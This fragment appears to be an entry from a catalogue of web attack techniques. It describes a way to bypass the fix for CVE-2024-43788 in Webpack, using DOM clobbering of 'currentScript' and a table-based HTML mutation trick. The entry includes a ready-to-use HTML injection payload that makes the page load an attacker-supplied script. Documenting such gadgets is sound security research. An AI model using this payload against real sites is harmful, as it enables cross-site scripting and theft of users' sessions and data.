      - description: It is possible to take part of the fix for [CVE-2024-43788](#<5.93.0) which uses the `src=` of the last `<script>` tag of the page to load additionnal modules. As with the CVE, it is mandatory to have the _AutoPublicPathRuntimeModule_ enabled.<br><br>*For this to work, the user input must be placed above the bundle script tag. We then use a trick use table HTML mutation to make it follow down the DOM tree. This ensures that when Webpack loads, our script is already in the DOM and positioned below it, something that normally shouldn't be possible, since the page stops loading while a script is being executed.*
        code: |
          <!-- user input -->
          <img name="currentScript"><table>
          <script src="[current-location]/assets/xss/index.js"></script>

          <div>
          <script nonce="secret" src="/assets/libs/webpack/bundle.js"></script>
          </div>
